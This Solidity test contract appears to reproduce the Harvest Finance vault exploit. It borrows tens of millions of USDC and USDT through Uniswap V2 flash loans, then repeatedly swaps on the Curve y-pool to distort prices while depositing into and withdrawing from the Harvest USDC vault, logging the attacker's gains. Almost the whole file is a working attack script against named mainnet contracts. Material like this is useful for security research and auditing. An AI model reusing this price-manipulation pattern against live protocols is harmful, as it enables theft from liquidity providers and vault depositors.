pragma solidity ^0.8.1;

import "hardhat/console.sol";
import "./interfaces/interface.sol";


contract ContractTest {
    // CONTRACTS
    // Uniswap ETH/USDC LP (UNI-V2)
    IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    // Uniswap ETH/USDT LP (UNI-V2)
    IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    // Curve y swap
    IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    // Harvest USDC pool
    IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    // ERC20s
    // 6 decimals on usdt
    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // 6 decimals on usdc
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // 6 decimals on yusdc
    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    // 6 decimals on yusdt
    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    // 6 decimals on fUSDT
    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    // 6 decimals on fUSDC
    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    uint256 usdcLoan = 50_000_000 * 10 ** 6;
    uint256 usdcRepayment = (usdcLoan * 100_301) / 100_000;
    uint256 usdtLoan = 17_300_000 * 10 ** 6;
    uint256 usdtRepayment = (usdtLoan * 100_301) / 100_000;
    uint256 usdcBal;
    uint256 usdtBal;

    // function setUp() public {
    //     vm.createSelectFork('http://127.0.0.1:8545'); 
    // }

    function testExploit() public {
        usdt.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(harvest), type(uint256).max);
        usdt.approve(address(usdtPair), type(uint256).max);
        usdc.approve(address(usdcPair), type(uint256).max);
        console.log("Before exploitation, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
        console.log("Before exploitation, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
        usdcPair.swap(usdcLoan, 0, address(this), "0x");

        console.log("After exploitation, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
        console.log("After exploitation, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(usdcPair)) {
            console.log("Flashloan, Amount of USDC received:", usdc.balanceOf(address(this)) / 1e6);
            usdtPair.swap(0, usdtLoan, address(this), "0x");
            bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);
        }

        if (msg.sender == address(usdtPair)) {
            console.log("Flashloan, Amount of USDT received:", usdt.balanceOf(address(this)) / 1e6);
            for (uint256 i = 0; i < 6; i++) {
                theSwap(i);
            }
            usdt.transfer(msg.sender, usdtRepayment);
        }
    }

    function theSwap(uint256 i) internal {
        curveYSwap.exchange_underlying(2, 1, 17_200_000 * 10 ** 6, 17_000_000 * 10 ** 6);
        harvest.deposit(49_000_000_000_000);
        curveYSwap.exchange_underlying(1, 2, 17_310_000 * 10 ** 6, 17_000_000 * 10 ** 6);
        harvest.withdraw(fusdc.balanceOf(address(this)));
        console.log("After swap, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
        console.log("After swap ,USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
    }

    receive() external payable {}
}